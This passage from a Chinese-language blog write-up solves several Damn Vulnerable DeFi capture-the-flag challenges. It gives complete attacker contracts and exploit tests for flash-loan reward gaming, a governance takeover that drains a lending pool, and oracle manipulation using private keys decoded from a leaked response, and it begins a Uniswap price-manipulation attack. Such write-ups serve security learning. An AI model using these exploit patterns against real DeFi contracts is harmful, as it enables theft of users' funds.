accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);<br><br>    if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;<br>        rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;<br><br>        if(rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;<br>            rewardToken.mint(msg.sender, rewards);<br>            lastRewardTimestamps[msg.sender] = block.timestamp;<br>        &#125;<br>    &#125;<br><br>    return rewards;     <br>&#125;<br><br><br>    function flashLoan(uint256 amount) external nonReentrant &#123;<br>        uint256 balanceBefore = liquidityToken.balanceOf(address(this));<br>        require(amount &lt;= balanceBefore, &quot;Not enough token balance&quot;);<br><br>        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);<br>        <br>        liquidityToken.transfer(msg.sender, amount);<br><br>        msg.sender.functionCall(<br>            abi.encodeWithSignature(<br>                &quot;receiveFlashLoan(uint256)&quot;,<br>                amount<br>            )<br>        );<br><br>        require(liquidityToken.balanceOf(address(this)) &gt;= balanceBefore, &quot;Flash loan not paid back&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>从 <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/the-rewarder/the-rewarder.challenge.js">test setup</a> 可以看到攻击开始时，4 个用户在上一轮已经存入了 400 个代币，每人获得了 25 个奖励代币。且我们可以从另一个池中以闪电贷的形式借最多 1000000 个代币。</p><p>而奖励的计算方式是整型，忽略了小数部分，只要我们的投入金额足够大，就会忽略掉其他四个用户的奖励。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../the-rewarder/FlashLoanerPool.sol&quot;;<br>import &quot;../the-rewarder/TheRewarderPool.sol&quot;;<br>import &quot;../the-rewarder/RewardToken.sol&quot;;<br>import &quot;../the-rewarder/AccountingToken.sol&quot;;<br><br>contract TheRewarderAttacker &#123;<br>    FlashLoanerPool flashLoanerPool;<br>    DamnValuableToken immutable liquidityToken;<br>    TheRewarderPool theRewarderPool;<br>    RewardToken rewardToken;<br><br>    constructor(address liquidityTokenAddress, address rewardTokenAddress, FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool) &#123;<br>        liquidityToken = DamnValuableToken(liquidityTokenAddress);<br>        rewardToken = RewardToken(rewardTokenAddress);<br>        theRewarderPool = _theRewarderPool;<br>        flashLoanerPool = _flashLoanerPool;<br>    &#125;<br><br>    function attack(uint256 amount) external &#123;<br>        flashLoanerPool.flashLoan(amount);<br><br>        rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));<br>    &#125;<br><br>    function receiveFlashLoan(uint256 amount) external &#123;<br>        //存入所有闪贷出的token<br>        liquidityToken.approve(address(theRewarderPool),amount);<br>        //rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));<br>        theRewarderPool.deposit(amount);<br>        //分发奖励<br>        //调用deposit函数时会自动调用distributeRewards函数<br>        //theRewarderPool.distributeRewards();<br>        //取出token<br>        theRewarderPool.withdraw(amount);<br>        //归还闪贷<br>        liquidityToken.transfer(address(flashLoanerPool),amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> ethers.provider.send(<span class="hljs-string">&quot;evm_increaseTime&quot;</span>, [<span class="hljs-number">5</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>]);<br>    <span class="hljs-keyword">const</span> TheRewarderAttacker = <span class="hljs-keyword">await</span>  ethers.getContractFactory(<span class="hljs-string">&#x27;TheRewarderAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> TheRewarderAttacker.deploy(<span class="hljs-built_in">this</span>.liquidityToken.address, <span class="hljs-built_in">this</span>.rewardToken.address, <span class="hljs-built_in">this</span>.flashLoanPool.address, <span class="hljs-built_in">this</span>.rewarderPool.address);<br>    <span class="hljs-keyword">await</span> Attacker.attack(TOKENS_IN_LENDER_POOL);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><blockquote><p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p><p>Wow, and it even includes a really fancy governance mechanism to control it.</p><p>What could go wrong, right ?</p><p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;<br>    require(_hasEnoughVotes(msg.sender), &quot;Not enough votes to propose an action&quot;);<br>    require(receiver != address(this), &quot;Cannot queue actions that affect Governance&quot;);<br>                                                                                          <br>    uint256 actionId = actionCounter;<br><br>    GovernanceAction storage actionToQueue = actions[actionId];<br>    actionToQueue.receiver = receiver;<br>    actionToQueue.weiAmount = weiAmount;<br>    actionToQueue.data = data;<br>    actionToQueue.proposedAt = block.timestamp;<br><br>    actionCounter++;<br><br>    emit ActionQueued(actionId, msg.sender);<br>    return actionId;<br>&#125;<br><br>function flashLoan(uint256 borrowAmount) external nonReentrant &#123;<br>        uint256 balanceBefore = token.balanceOf(address(this));<br>        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br>        <br>        token.transfer(msg.sender, borrowAmount);        <br>        <br>        require(msg.sender.isContract(), &quot;Sender must be a deployed contract&quot;);<br>        msg.sender.functionCall(<br>            abi.encodeWithSignature(<br>                &quot;receiveTokens(address,uint256)&quot;,<br>                address(token),<br>                borrowAmount<br>            )<br>        );<br>        <br>        uint256 balanceAfter = token.balanceOf(address(this));<br><br>        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>    &#125;<br><br>    function drainAllFunds(address receiver) external onlyGovernance &#123;<br>        uint256 amount = token.balanceOf(address(this));<br>        token.transfer(receiver, amount);<br>        <br>        emit FundsDrained(receiver, amount);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>drainAllFunds</code> 允许从池中转移所有代币，并受 <code>onlyGovernance</code> 修饰符的保护。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../selfie/SimpleGovernance.sol&quot;;<br>import &quot;../selfie/SelfiePool.sol&quot;;<br><br>contract SelfieAttacker &#123;<br>    SimpleGovernance governance;<br>    SelfiePool pool;<br>    address attacker;<br>    uint256 actionId;<br><br>    constructor(SimpleGovernance _governance,SelfiePool _pool) &#123;<br>        governance = _governance;<br>        pool = _pool;<br>        attacker = msg.sender;<br>    &#125;<br><br>    function attack1(uint256 amount) external &#123;<br>        pool.flashLoan(amount);<br>    &#125;<br><br>//在等待 2 天后执行它并执行它以耗尽所有令牌<br>    function attack2() external &#123;<br>        governance.executeAction(actionId);<br>    &#125;<br><br>    function receiveTokens(address _token,uint256 borrowAmount) external &#123;<br>    //创建治理代币的快照<br>        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);<br>        token.snapshot();<br><br>//排队提案<br>        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);<br>        actionId =governance.queueAction(address(pool),data,0);<br><br>//归还贷款<br>        token.transfer(address(pool),borrowAmount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> SelfieAttacker = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;SelfieAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> SelfieAttacker.deploy(<span class="hljs-built_in">this</span>.governance.address,<span class="hljs-built_in">this</span>.pool.address);<br><br>    <span class="hljs-keyword">await</span> Attack.attack1(TOKENS_IN_POOL);<br>    <span class="hljs-keyword">await</span> ethers.provider.send(<span class="hljs-string">&quot;evm_increaseTime&quot;</span>, [<span class="hljs-number">2</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>]); <span class="hljs-comment">// 2 days</span><br>    <span class="hljs-keyword">await</span> Attack.attack2();<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><blockquote><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">content-language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">server</span><span class="hljs-punctuation">: </span>cloudflare<br><br><span class="apache"><span class="hljs-attribute">4d</span> <span class="hljs-number">48</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">63</span> <span class="hljs-number">34</span> <span class="hljs-number">5</span>a <span class="hljs-number">57</span> <span class="hljs-number">59</span> <span class="hljs-number">78</span> <span class="hljs-number">59</span> <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>b <span class="hljs-number">59</span> <span class="hljs-number">54</span> <span class="hljs-number">59</span> <span class="hljs-number">31</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">5</span>a <span class="hljs-number">6</span>d <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">55</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">46</span> <span class="hljs-number">6</span>b <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">51</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>f <span class="hljs-number">54</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>a <span class="hljs-number">5</span>a <span class="hljs-number">47</span> <span class="hljs-number">5</span>a <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">42</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>d <span class="hljs-number">4</span>d <span class="hljs-number">34</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">49</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">42</span> <span class="hljs-number">69</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>a <span class="hljs-number">42</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>f <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">52</span> <span class="hljs-number">68</span> <span class="hljs-number">5</span>a <span class="hljs-number">54</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>d <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">63</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">4d</span> <span class="hljs-number">48</span> <span class="hljs-number">67</span> <span class="hljs-number">79</span> <span class="hljs-number">4</span>d <span class="hljs-number">44</span> <span class="hljs-number">67</span> <span class="hljs-number">79</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">42</span> <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">52</span> <span class="hljs-number">6</span>d <span class="hljs-number">59</span> <span class="hljs-number">54</span> <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">5</span>a <span class="hljs-number">44</span> <span class="hljs-number">67</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>f <span class="hljs-number">57</span> <span class="hljs-number">55</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>f <span class="hljs-number">44</span> <span class="hljs-number">56</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>d <span class="hljs-number">6</span>a <span class="hljs-number">4</span>d <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">64</span> <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>c <span class="hljs-number">5</span>a <span class="hljs-number">44</span> <span class="hljs-number">6</span>c <span class="hljs-number">69</span> <span class="hljs-number">5</span>a <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">41</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">46</span> <span class="hljs-number">6</span>c <span class="hljs-number">4</span>f <span class="hljs-number">54</span> <span class="hljs-number">67</span> <span class="hljs-number">33</span> <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">51</span> <span class="hljs-number">33</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">42</span> <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">6</span>a <span class="hljs-number">51</span> <span class="hljs-number">34</span></span><br><span class="apache"></span><br></code></pre></td></tr></table></figure><p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each</p><p>This price is fetched from an on-chain oracle, and is based on three trusted reporters: <code>0xA73209FB1a42495120166736362A1DfA9F95A105</code>,<code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code> and <code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code>.</p><p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;<br>    _setPrice(msg.sender, symbol, newPrice);<br>&#125;<br><br>    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;<br>        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));<br><br>        // calculate median price<br>        if (prices.length % 2 == 0) &#123;<br>            uint256 leftPrice = prices[(prices.length / 2) - 1];<br>            uint256 rightPrice = prices[prices.length / 2];<br>            return (leftPrice + rightPrice) / 2;<br>        &#125; else &#123;<br>            return prices[prices.length / 2];<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>只有onlyTrustedSource才能修改价格</p><p>当价格的数组的长度为奇数时，它取中间的一个并将其称为中值价格。我们恰好有三个管理员</p><p>分析题目给出的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">data1 = <span class="hljs-string">&quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;</span>;<br>hexdata1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;</span>.join(data1.split())).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>base64data1 = base64.b64decode(hexdata1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data1&#x27;</span>)<br><span class="hljs-built_in">print</span>(hexdata1)<br><span class="hljs-built_in">print</span>(base64data1)<br><br>data2 = <span class="hljs-string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span><br>hexdata2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;</span>.join(data2.split())).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>base64data2 = base64.b64decode(hexdata2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data2&#x27;</span>)<br><span class="hljs-built_in">print</span>(hexdata2)<br><span class="hljs-built_in">print</span>(base64data2)<br></code></pre></td></tr></table></figure><p>得到私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">data1<br>MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5<br><span class="hljs-string">b&#x27;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#x27;</span><br>data2<br>MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4<br><span class="hljs-string">b&#x27;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">let</span> privateKey1 = <span class="hljs-string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span>;<br>    <span class="hljs-keyword">let</span> privateKey2 = <span class="hljs-string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span>;<br>    <span class="hljs-keyword">let</span> compromisedOracle1 = <span class="hljs-keyword">new</span> ethers.Wallet(privateKey1, ethers.provider);<br>    <span class="hljs-keyword">let</span> compromisedOracle2 = <span class="hljs-keyword">new</span> ethers.Wallet(privateKey2, ethers.provider);<br><br>    <span class="hljs-comment">//修改为最低价</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//买入</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.exchange.connect(attacker).buyOne(&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">1</span>&#125;);<br><br>    <span class="hljs-comment">//修改为最高价</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,EXCHANGE_INITIAL_ETH_BALANCE.add(<span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,EXCHANGE_INITIAL_ETH_BALANCE.add(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">//卖出</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.nftToken.connect(attacker).approve(<span class="hljs-built_in">this</span>.exchange.address, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.exchange.connect(attacker).sellOne(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">//修改为原始价格</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,INITIAL_NFT_PRICE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,INITIAL_NFT_PRICE);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><blockquote><p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p><p>There’s a DVT market opened in an <a href="https://docs.uniswap.org/protocol/V1/introduction">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p><p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function borrow(uint256 borrowAmount) public payable nonReentrant &#123;<br>        uint256 depositRequired = calculateDepositRequired(borrowAmount);<br>        <br>        require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);<br>        <br>        if (msg.value &gt; depositRequired) &#123;<br>            payable(msg.sender).sendValue(msg.value - depositRequired);<br>        &#125;<br><br>        deposits[msg.sender] = deposits[msg.sender] + depositRequired;<br><br>        // Fails if the pool doesn&#x27;t have enough tokens in liquidity<br>        require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);<br><br>        emit Borrowed(msg.sender, depositRequired, borrowAmount);<br>    &#125;<br><br>function _computeOraclePrice() private view returns (uint256) &#123;<br>    // calculates the price of the token in wei according to Uniswap pair<br>    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过改变 uniswap 交易对中的 ether 和 DVT 的余额，我们可以操纵价格，从而操纵从 PuppetPool 借入代币所需的抵押品数量。我们希望所有 DVT 的以太币抵押品尽可能少，为此我们首先必须引发价格暴跌。为此，我们需要减少 uniswap 对的以太币余额并尽可能增加 DVT 代币余额。</p><p>可以借助<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/build-uniswap-v1/UniswapV1Exchange.json">UniswapV1Exchange.json</a>中的 <code>tokenToEthSwapInput</code> 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;tokenToEthSwapInput&quot;</span>,<br>  <span class="hljs-string">&quot;outputs&quot;</span>: [&#123; <span class="hljs-string">&quot;type&quot;</span>: <span 